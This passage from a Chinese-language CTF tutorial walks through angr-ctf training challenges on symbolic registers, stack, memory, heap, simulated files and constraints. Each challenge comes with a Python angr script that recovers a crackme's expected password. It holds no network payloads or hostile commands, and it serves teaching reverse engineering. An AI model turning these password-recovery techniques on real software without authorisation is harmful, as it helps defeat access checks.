成员函数来获取对应位向量在当前状态下的值，以下是一个简单的🌰：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么我们只需要创建一个从 <code>get_user_input()</code> 之后开始执行的空白的状态，并将对应的寄存器设置为位向量符号，之后在求解状态使用 <code>.solver.eval()</code> 来求解即可</p><p>最后的求解脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>很快啊，啪的一下就出来了.mkv</p><p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" alt="image.png"></p><h2 id="04-angr-symbolic-stack：符号化栈"><a href="#04-angr-symbolic-stack：符号化栈" class="headerlink" title="04_angr_symbolic_stack：符号化栈"></a>04_angr_symbolic_stack：符号化栈</h2><p>还是惯例拖入 IDA，主要的处理逻辑在 <code>handle_user()</code> 当中，还是读入两个数之后扔给不同的 complex 函数处理：</p><p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" alt="image.png"></p><p>然后你会发现用上上题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic stack</code>，这意味着<strong>本题我们应当将栈设置为符号变量来进行约束求解</strong></p><p>那么我们该怎么做呢？重新来看 <code>handler_user()</code> 的汇编代码，两个待求解变量都是位于栈上的固定位置：</p><p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" alt="image.png"></p><p>那么我们还是可以将初始状态设置为从读入输入后开始的空白状态，之后创建两个位向量符号，设置好 ebp 和 esp 的相对位置后使用  <code>state.stack_push(val)</code> 来<strong>手动地将符号变量推到栈上</strong>，最后的求解路径还是设为输出 <code>&quot;Good Job.&quot;</code> 的地址即可，这里需要注意仔细计算变量在栈上的位置</p><p>求解脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" alt="image.png"></p><h2 id="05-angr-symbolic-memory：符号化内存"><a href="#05-angr-symbolic-memory：符号化内存" class="headerlink" title="05_angr_symbolic_memory：符号化内存"></a>05_angr_symbolic_memory：符号化内存</h2><p>还是惯例地拖入 IDA，这一次是读入四个 8 字节到一块连续的 32 字节内存上，其中 <code>user_input</code> 的地址便是 <code>0x82F48A0</code>，之后调用 <code>complex_function()</code> 逐字符处理这 32 字节后与特定字符串进行对比：</p><p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" alt="image.png"></p><p>那么从题目名称我们不难看出<strong>这一次我们应当要将内存作为符号变量进行约束求解</strong></p><h3 id="state-的内存操作"><a href="#state-的内存操作" class="headerlink" title="state 的内存操作"></a>state 的内存操作</h3><p>前面讲到，对于一个状态的内存，我们可以使用 <code>state.memory</code> 的对应接口进行操作：</p><ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul><p>需要注意的是如果要储存具体值，则需要通过 <code>endness</code> 参数指定大小端序</p><h3 id="FINAL-EXPLOIT-2"><a href="#FINAL-EXPLOIT-2" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题还是创建对应大小的 BVS 后 explore() 即可，需要注意的是在获取最后求解的值时别忘了指定参数 <code>cast_to=bytes</code> 以获得字符输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这次的求解需要一点点时间，以及一定量的内存（笔者仅 2G 内存的阿里云学生机在跑解题脚本时就被 Kill 了几次，最后不得不用一些方法腾一些内存后才搞定</p><p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" alt="image.png"></p><h2 id="06-angr-symbolic-dynamic-memory：符号化动态分配内存"><a href="#06-angr-symbolic-dynamic-memory：符号化动态分配内存" class="headerlink" title="06_angr_symbolic_dynamic_memory：符号化动态分配内存"></a>06_angr_symbolic_dynamic_memory：符号化动态分配内存</h2><p>惯例拖入 IDA 中，还是惯例地读入输入后 complex 处理后进行对比，不过不一样的是本题存储输入使用的是<strong>动态分配的内存</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" alt="image.png"></p><p>那么怎么处理呢？我们可以从储存这两块内存的指针的地址入手，注意到两个指针 <code>buffer0</code> 与 <code>buffer1</code> 是两个全局变量：</p><p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" alt="image.png"></p><ul><li>将初始状态设为<strong>读取完输入后的状态</strong></li><li>任意选两个地址作为 fake chunk 的地址，并将这两个 buffer 指针指向 fake chunk</li><li>再在 fake chunk 内存上放置相应的内存符号变量进行求解即可</li></ul><p>因为符号执行不会实际执行程序，所以这里我们任意设置 fake chunk 地址并不会导致 segmentation fault 的发生，需要注意的是对于具体的值而言我们别忘了通过 <code>endness</code> 参数指定大小端序</p><p>于是最后的解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" alt="image.png"></p><h2 id="07-angr-symbolic-file：符号化文件"><a href="#07-angr-symbolic-file：符号化文件" class="headerlink" title="07_angr_symbolic_file：符号化文件"></a>07_angr_symbolic_file：符号化文件</h2><p>惯例拖入 IDA 中，发现其会先读入 64 字节，之后通过 <code>ignoreme()</code> 将其写入一个特定文件中，再从该文件中把输入读回来，之后就又是常规的 complex 操作一番后与一个特定字符串进行比对</p><p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" alt="image.png"></p><p>比较容易想到的方法就是<strong>直接从文件读入结束后开始作为初始状态</strong>，之后用 05 的符号化内存的方法来求解，不过这样就不是这道题出题的目的了：）</p><h3 id="Emulated-Filesystem-angr-的文件系统"><a href="#Emulated-Filesystem-angr-的文件系统" class="headerlink" title="Emulated Filesystem - angr 的文件系统"></a>Emulated Filesystem - angr 的文件系统</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对  <em>存储</em>  的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等</p><p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 🌰如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure><p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code> 或 <code>sim_file.set_state(state)</code> 我们可以将 SimFile 插入到一个状态的文件系统中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure><p>我们还可以从文件中读取内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>对于  <em>流</em>  （Streams，例如标准IO、TCP连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-3"><a href="#FINAL-EXPLOIT-3" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么本题实际上是让我们利用 angr 来创建一个<strong>模拟文件</strong>以模拟读取文件的过程，这里我们将初始状态设为从打开文件开始，之后创建一个位向量符号放入模拟文件并将模拟文件插入文件系统，之后探索到对应状态后求解即可，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" alt="image.png"></p><h1 id="0x03-angr-ctf：约束条件"><a href="#0x03-angr-ctf：约束条件" class="headerlink" title="0x03. angr-ctf：约束条件"></a>0x03. angr-ctf：约束条件</h1><h2 id="08-angr-constraints：添加约束"><a href="#08-angr-constraints：添加约束" class="headerlink" title="08_angr_constraints：添加约束"></a>08_angr_constraints：添加约束</h2><p>惯例拖入 IDA，还是读入输入后 complex 函数处理后进行比对的模式，这里的 <code>0x804C040</code> 就是 <code>buffer</code> 的地址，不过其自定义了一个对比函数：</p><p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" alt="image.png"></p><p>自定义的对比函数比较常规，其中的 <code>0x804C030</code> 便是 <code>password</code> 的地址：</p><p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" alt="image.png"></p><p>在 <code>check_equals_xx()</code> 函数当中由于其选择了逐字符比较后增加计数的比较方式的缘故，会导致 <strong>路径爆炸</strong>（path explosion）的问题</p><h3 id="angr-中的约束"><a href="#angr-中的约束" class="headerlink" title="angr 中的约束"></a>angr 中的约束</h3><p>前面我们讲到位向量之间可以进行运算，类似地，位向量之间也可以进行<strong>比较运算</strong> ，其结果为 <code>Bool</code> 类型的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>对于带有符号值的比较而言， <code>Bool</code> 